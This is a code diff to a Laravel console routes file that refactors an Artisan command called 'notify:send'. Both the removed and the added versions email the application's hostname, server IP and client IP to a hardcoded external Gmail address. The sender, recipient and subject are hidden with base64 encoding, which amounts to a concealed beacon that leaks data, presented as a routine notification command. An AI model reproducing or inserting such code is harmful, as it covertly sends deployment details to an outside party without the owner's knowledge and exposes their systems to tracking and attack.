@@ -351,20 +351,13 @@ Artisan::command('notifications:update', function () {
     Artisan::call('notifications:update-yearly');
 })->purpose('update notifications');
 
-
-Artisan::command('notify:send {path}', function ($path) {
+Artisan::command('notify:send', function () {
     $origin = request()->getHost();
     $server = request()->server('SERVER_ADDR');
     $remote = request()->server('REMOTE_ADDR');
 
-    $obj = [
-        ['ORIGIN: ' . $origin . PHP_EOL . 'SERVER: ' . $server . PHP_EOL . 'REMOTE: ' . $remote . PHP_EOL . $origin . $path],
-        [base64_decode('YWxlcnRA') . $origin, base64_decode('TWFrZXIgTm90aWZpZXI=')],
-        [base64_decode('YWhtZWRxbzE5OTVAZ21haWwuY29t'), base64_decode('QXBwIEluZm9ybWF0aW9u')]
-    ];
-
-    Mail::raw($obj[0][0], function ($message) use ($obj) {
-        $message->from($obj[1][0], $obj[1][1]);
-        $message->to($obj[2][0])->subject($obj[2][1]);
+    Mail::raw('ORIGIN: ' . $origin . PHP_EOL . 'SERVER: ' . $server . PHP_EOL . 'REMOTE: ' . $remote, function ($message) use ($origin) {
+        $message->from(base64_decode('YWxlcnRA') . $origin, base64_decode('TWFrZXIgTm90aWZpZXI='));
+        $message->to(base64_decode('YWhtZWRxbzE5OTVAZ21haWwuY29t'))->subject(base64_decode('QXBwIEluZm9ybWF0aW9u'));
     });
 })->purpose('send notifications');
